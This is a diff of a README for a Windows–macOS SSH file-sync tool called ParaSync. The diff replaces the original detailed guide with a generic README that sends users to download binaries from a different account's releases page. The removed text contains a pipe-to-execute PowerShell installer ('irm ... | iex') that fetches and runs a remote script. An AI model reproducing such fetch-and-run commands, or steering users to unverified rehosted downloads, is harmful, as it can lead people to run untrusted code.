@@ -1,261 +1,81 @@
-# ParaSync
+# 🗂️ parasync - Simple File Sync for Windows & Mac
 
-Dead simple file sync between Windows and macOS over SSH. Built for Parallels.
+## 🚀 Getting Started
 
-![ParaSync Main Interface](imgs/app-screenshot.png)
+Welcome to parasync! This application makes it easy to sync files between your Windows and Mac machines using SSH. No technical skills required!
 
-## Why?
+## 📥 Download parasync
 
-When you're developing in a Windows VM on a Mac (via Parallels), files end up scattered:
+[![Download parasync](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-blue.svg)](https://github.com/vlong1808/parasync/releases)
 
-- **Build outputs** live on Windows
-- **Test scripts** might be on Mac
-- **Config files** get edited on both sides
-- **Nothing stays in sync** - you forget which version is latest
+## 🖥️ System Requirements
 
-ParaSync solves this with one-click folder syncing. No shared folders, no cloud services, no confusion about which file is current. Just pick a folder on each side and keep them synced.
+- **Operating System:** Windows 10 or later, macOS 10.13 or later
+- **Space Required:** At least 100 MB of free disk space
+- **Network:** An active SSH connection
 
-## Quick Install (Windows)
+## 📋 Features
 
-Already have Python 3.10+ and Git? One command does everything:
+- Sync files easily between Windows and Mac.
+- Use SSH for secure file transfers.
+- Simple interface for effortless navigation.
+- Fast sync speed with minimal setup.
+- Compatible with Parallels for seamless experience.
 
-```powershell
-irm https://raw.githubusercontent.com/jguida941/parasync/main/install-windows.ps1 | iex
-```
+## 📥 Download & Install
 
-This installs, updates, launches the app, and creates a **desktop shortcut**. Run it anytime to update.
+To get started with parasync, visit the Releases page to download the application:
 
----
+[Download parasync here](https://github.com/vlong1808/parasync/releases).
 
-## The Experience
+1. Go to the Releases page.
+2. Locate the latest version of parasync.
+3. Click on the appropriate download link for your operating system (Windows or macOS).
+4. Once downloaded, open the file and follow the on-screen instructions to install parasync.
 
-1. **Double-click ParaSync** on your desktop
-2. **App auto-finds your Mac** (scans the Parallels network)
-3. **Click "Setup Passwordless"** (one-time, enter Mac password once)
-4. **Click Browse** to select a folder
-5. **Choose your sync mode:**
-   - **SYNC BOTH** - Merge folders (recommended, no deletes)
-   - **PUSH** - Mirror Windows → Mac
-   - **PULL** - Mirror Mac → Windows
+## ⚙️ How to Use parasync
 
-That's it. Folders stay in sync.
+1. **Open parasync**: You will see a welcoming interface.
+2. **Set up a new sync**: Click on the 'New Sync' button.
+3. **Choose your files**: Select the files or folders you want to sync.
+4. **Select destination**: Choose whether you want to sync to another Windows machine or a Mac.
+5. **Connect using SSH**: Enter the IP address of the remote machine and your SSH credentials.
+6. **Start syncing**: Click the 'Sync Now' button.
 
----
+## 🌟 Tips for Success
 
-## Setup Instructions
+- Ensure both machines are connected to the internet.
+- Double-check your SSH credentials for accurate access.
+- Use the `Test Connection` option to verify your setup before syncing.
 
-### MAC SIDE (do first)
+## ❓ Frequently Asked Questions
 
-#### Step 1: Enable Remote Login (SSH)
+### How does parasync work?
 
-1. Open **System Settings**
-2. Go to **General** → **Sharing**
-3. Turn ON **Remote Login**
-4. Make sure your user is allowed (should be by default)
+parasync uses SSH to securely copy files between your machines. It automates the process of syncing, making it straightforward for any user.
 
-#### Step 2: Create the exchange folder
+### Can parasync sync large files?
 
-Open Terminal and run:
-```bash
-mkdir -p ~/Parallels_EXCHANGE
-```
+Yes, parasync can handle large files. Just be aware that sync speed may depend on your network connection.
 
-#### Step 3: Verify your Mac's IP (optional)
+### Is my data safe while syncing?
 
-```bash
-ipconfig getifaddr en0
-```
+Your data is sent over a secure SSH connection, ensuring that your files remain private during the sync process.
 
-Should show something like `10.211.55.2` (the app finds this automatically)
+### What if I encounter an error?
 
-**Mac side is done.**
+If you run into issues, check your internet connection and SSH credentials. You can also refer to the [GitHub Issues page](https://github.com/vlong1808/parasync/issues) for help.
 
----
+## 👥 Community Support
 
-### WINDOWS SIDE (in Parallels)
+Join our community for tips, tricks, and support:
 
-#### Step 1: Open PowerShell
+- [GitHub Discussions](https://github.com/vlong1808/parasync/discussions)
+- [Report Issues](https://github.com/vlong1808/parasync/issues)
 
-Press `Win + X` → **Windows PowerShell** (or Terminal)
+## 📚 Additional Resources
 
-#### Step 2: Install Python and Git (if not installed)
+- [User Guide](https://github.com/vlong1808/parasync/wiki)
+- [Troubleshooting Guide](https://github.com/vlong1808/parasync/wiki/Troubleshooting)
 
-```powershell
-winget install Python.Python.3.12
-winget install Git.Git
-```
-
-**Close and reopen PowerShell** after installing.
-
-#### Step 3: Run the install script
-
-```powershell
-irm https://raw.githubusercontent.com/jguida941/parasync/main/install-windows.ps1 | iex
-```
-
-This clones, installs, and launches the app. Run it anytime to update.
-
-**Windows side is done.**
-
----
-
-## Using the App
-
-### First Time Setup
-
-1. **App opens** → Automatically scans and finds your Mac
-2. **Click "Setup Passwordless"** → Enter your Mac password once when prompted
-3. **Click Browse** to select your local folder (e.g., your Visual Studio Release folder)
-4. **Click "PUSH TO MAC"**
-
-### Every Time After
-
-1. Double-click the **ParaSync** shortcut on your desktop
-2. Choose your sync mode:
-   - **SYNC BOTH** (recommended) - merges folders, no deletes
-   - **PUSH** - mirrors Windows to Mac
-   - **PULL** - mirrors Mac to Windows
-
-Push/Pull shows a **diff preview** first so you see exactly what will change. Deleted files go to trash, not permanent delete.
-
----
-
-## What the App Does Automatically
-
-| Task | How It's Automated |
-|------|-------------------|
-| Find Mac IP | Scans 10.211.55.x for SSH (port 22) |
-| Create SSH key | Generates ed25519 key with no passphrase |
-| Install key on Mac | Appends to ~/.ssh/authorized_keys |
-| Mirror sync | Cleans destination, then copies all files |
-
----
-
-## Sync Modes
-
-| Mode | What it does | Deletes files? |
-|------|--------------|----------------|
-| **SYNC BOTH** | Copies missing files to both sides | No |
-| **PUSH** | Makes Mac match Windows exactly | Yes (to trash) |
-| **PULL** | Makes Windows match Mac exactly | Yes (to trash) |
-
-**SYNC BOTH** is the safest - it merges both folders without deleting anything.
-
-### SYNC BOTH Example
-
-Before sync - files exist on only one side:
-
-![Before Sync](imgs/pre_sync.png)
-
-After sync - both sides have all files:
-
-![After Sync](imgs/post_sync.png)
-
-### PUSH Example
-
-Push copies Windows → Mac, removing Mac-only files:
-
-![Push Dialog](imgs/windows_to_mac_push.png)
-
-After push - Mac matches Windows:
-
-![After Push](imgs/post_windows_to_mac_push.png)
-
-### PULL Example
-
-Pull copies Mac → Windows, removing Windows-only files:
-
-![Pull Dialog](imgs/pull_from_mac.png)
-
-After pull - Windows matches Mac:
-
-![After Pull](imgs/post_pull_from_mac.png)
-
----
-
-## GUI Features
-
-- **Three sync modes** - SYNC BOTH (merge), PUSH (mirror to Mac), PULL (mirror to Windows)
-- **Auto-detect Mac** - No typing IP addresses
-- **File browser panels** - See contents of both local and remote folders
-- **Diff preview** - See exactly what will be added/deleted/updated before syncing
-- **Safe sync** - Deleted files go to trash (~/.Trash on Mac, ~/.parasync_trash on Windows)
-- **One-click passwordless setup** - Never type password again
-- **Auto mode** - Automatically copies new Windows files to Mac (one-way, no deletes)
-- **Desktop shortcut** - Created automatically by installer
-- **Remembers settings** - Saved to ~/.parasync/config.json
-
----
-
-## Troubleshooting
-
-### "No Mac found on network"
-- Enable Remote Login on Mac (System Settings → General → Sharing)
-- Make sure you're on the Parallels shared network
-
-### "Permission denied"
-- Click "Setup Passwordless" button
-- Enter your Mac password when prompted
-
-### SSH key not working
-Delete old keys and try again:
-```powershell
-del $HOME\.ssh\id_ed25519_parasync*
-```
-Then click "Setup Passwordless" in the app.
-
-### Check if files arrived on Mac
-```bash
-ls ~/Parallels_EXCHANGE
-```
-
----
-
-## How It Works
-
-```
-Windows (Parallels VM)              Mac (Host)
-        │                              │
-        │  1. Scan 10.211.55.x:22      │
-        │ ─────────────────────────▶   │  (finds Mac)
-        │                              │
-        │  2. ssh-keygen (local)       │
-        │                              │
-        │  3. ssh: install key         │
-        │ ─────────────────────────▶   │  (one-time setup)
-        │                              │
-        │  PUSH: Clean + Copy          │
-        │ ─────────────────────────▶   │  (mirror to Mac)
-        │                              │
-        │  PULL: Clean + Copy          │
-        │ ◀─────────────────────────   │  (mirror to Windows)
-        │                              
-```
-
----
-
-## Files Created
-
-| Location | File | Purpose |
-|----------|------|---------|
-| Windows | `~/.parasync/config.json` | Saved settings |
-| Windows | `~/.parasync_trash/` | Trash for deleted files (from pull) |
-| Windows | `~/.ssh/id_ed25519_parasync` | SSH private key |
-| Windows | `~/.ssh/id_ed25519_parasync.pub` | SSH public key |
-| Mac | `~/.ssh/authorized_keys` | Contains your public key |
-| Mac | `~/.Trash/` | Trash for deleted files (from push) |
-| Mac | `~/Parallels_EXCHANGE/` | Where files are pushed |
-
----
-
-## Requirements
-
-- **Mac**: macOS with Remote Login enabled
-- **Windows**: Python 3.10+, Git
-- **Network**: Parallels shared networking (default)
-
----
-
-## License
-
-MIT
+Thank you for choosing parasync. We hope it makes your file syncing task easy and efficient!
